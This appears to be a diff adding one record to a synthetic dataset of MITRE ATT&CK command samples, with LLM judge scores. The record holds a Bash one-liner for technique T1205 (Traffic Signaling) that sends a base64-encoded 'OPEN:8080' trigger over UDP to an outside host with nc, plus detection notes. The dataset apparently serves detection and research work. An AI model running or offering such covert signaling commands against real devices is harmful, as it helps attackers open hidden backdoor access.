@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "echo -n 'OPEN:8080' | base64 -w0 | nc -u -w1 203.0.113.1 40000",
+  "explanation": "Encodes a magic control string with base64 and sends it via UDP/40000 as a covert signal to instruct a listener to open TCP/8080. No elevated privileges are required to transmit. Detection: inspect unusual base64-like payloads to high, otherwise unused UDP ports and correlate with subsequent firewall state changes.",
+  "rationale_steps": [
+    "Form a simple magic token indicating the port to open.",
+    "Base64-encode for formatting (not obfuscation).",
+    "Deliver to a predefined UDP signaling port via nc.",
+    "Detection: DPI for base64 blobs to control ports and monitoring for new ACCEPT rules following such packets."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-bba1a632-8f87a215",
+  "source_prompt_hash": "bba1a632",
+  "timestamp_utc": "2025-09-30T05:49:31.290544Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The pipeline is well-formed with balanced quotes and valid options for echo, base64, and nc, and correctly specifies UDP destination host and port.",
+        "semantic_score": 4,
+        "semantic_justification": "It base64-encodes a trigger string and sends it over UDP to a high port as a covert signal consistent with Traffic Signaling, though tool/flag availability on network devices may vary.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T18:40:30.212711Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax, balanced quotes, valid pipes, and appropriate flags for all commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely executes the described intent of encoding a control string and sending it as a covert UDP signal, perfectly aligning with the T1205 Traffic Signaling technique and using appropriate tools and arguments.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T18:40:39.022953Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
